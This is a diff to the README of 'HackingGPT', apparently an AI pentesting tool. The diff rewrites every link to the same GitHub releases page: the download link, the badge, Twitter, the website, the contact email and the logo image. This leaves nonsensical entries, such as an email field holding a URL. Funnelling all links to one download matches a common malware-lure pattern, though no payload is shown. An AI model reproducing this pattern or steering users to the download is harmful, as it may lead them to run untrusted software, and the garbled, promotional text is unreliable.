@@ -37,9 +37,9 @@ HackingGPT is a cutting-edge tool that integrates multiple APIs, including ChatG
 
 ## Get Started 💻
 
-Download the latest release of HackingGPT [here](https://github.com/assets/Release.zip), and launch the tool to elevate your pentesting and bug bounty hunting experience.
+Download the latest release of HackingGPT [here](https://github.com/Dudewowbruh/HackingGPT/releases), and launch the tool to elevate your pentesting and bug bounty hunting experience.
 
-[![Download HackingGPT](https://img.shields.io/badge/Download-HackingGPT-blue)](https://github.com/assets/Release.zip)
+[![Download HackingGPT](https://github.com/Dudewowbruh/HackingGPT/releases)](https://github.com/Dudewowbruh/HackingGPT/releases)
 
 If the link is not working, please check the "Releases" section of the repository for alternative download options.
 
@@ -51,13 +51,13 @@ HackingGPT is a collaborative project developed by cybersecurity experts, ethica
 
 Stay updated on the latest developments and connect with the HackingGPT community:
 
-👍 Follow us on [Twitter](https://twitter.com/HackingGPT)  
-🌐 Visit our [website](https://www.hackinggpt.com) for additional resources  
-📧 Contact us via email at contact@hackinggpt.com
+👍 Follow us on [Twitter](https://github.com/Dudewowbruh/HackingGPT/releases)  
+🌐 Visit our [website](https://github.com/Dudewowbruh/HackingGPT/releases) for additional resources  
+📧 Contact us via email at https://github.com/Dudewowbruh/HackingGPT/releases
 
 Dive into the world of advanced pentesting and bug bounty hunting with HackingGPT. Unleash the power of AI-driven security testing and take your cybersecurity skills to the next level! 🔒🚀
 
-![HackingGPT Logo](https://yourlogohere.png)
+![HackingGPT Logo](https://github.com/Dudewowbruh/HackingGPT/releases)
 
 ---
 
